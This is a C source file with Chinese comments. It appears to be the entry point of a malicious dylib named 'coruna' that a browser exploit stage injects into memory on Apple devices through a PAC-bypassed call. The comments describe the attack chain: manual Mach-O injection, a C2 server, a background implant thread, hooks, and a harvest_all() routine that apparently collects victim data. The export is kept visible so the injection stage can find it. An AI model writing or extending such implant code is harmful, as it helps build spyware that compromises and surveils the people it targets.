/*
 * Stage3_VariantB.js（Go 仓库内 PATCH）同步拉取 code.dylib 后，会解析 LC_SYMTAB，
 * 查找名为 "_process" 的导出符号，找不到则抛错 → C2 侧看到 coruna chain error。
 *
 * Stage3 使用的是手动 Mach-O 内存注入（不是 dlopen），因此
 * __attribute__((constructor)) 不会自动触发。
 * process() 必须是真正的入口点，负责启动后台植入线程。
 *
 * 执行顺序：
 *   Stage3 调用 _process (PAC-bypassed caller)
 *   → process() → coruna_constructor() → 后台线程 → implant_main()
 *   → ke_run() / hook_slot 等待 → harvest_all()
 */

/* coruna_constructor 定义在 main.c，通过 extern 跨翻译单元调用 */
extern void coruna_constructor(void);

/* ── dylib 主入口（由 Stage3 直接调用）────────────────────────────────────── */
/*
 * Stage3_VariantB.js 通过 PAC-bypassed caller 跳转到此符号。
 * 必须保持 default visibility，否则被 -fvisibility=hidden 剔出导出表，
 * Stage3 无法在 LC_SYMTAB 中找到 _process → 抛错 → 链失败。
 *
 * 此函数在 Stage3 调用线程中执行（WebContent 主线程或 Worker），
 * 必须尽快返回，所有耗时操作均由后台线程完成。
 */
__attribute__((visibility("default")))
void process(void) {
    /*
     * Stage3 是手动 Mach-O 注入，不经过 dyld，__attribute__((constructor))
     * 不会自动触发。在此手动调用 coruna_constructor() 以启动后台线程。
     * coruna_constructor 内部使用 dispatch_once 保证只初始化一次，
     * 即使将来同时走 dlopen 路径也不会重复启动。
     */
    coruna_constructor();
}
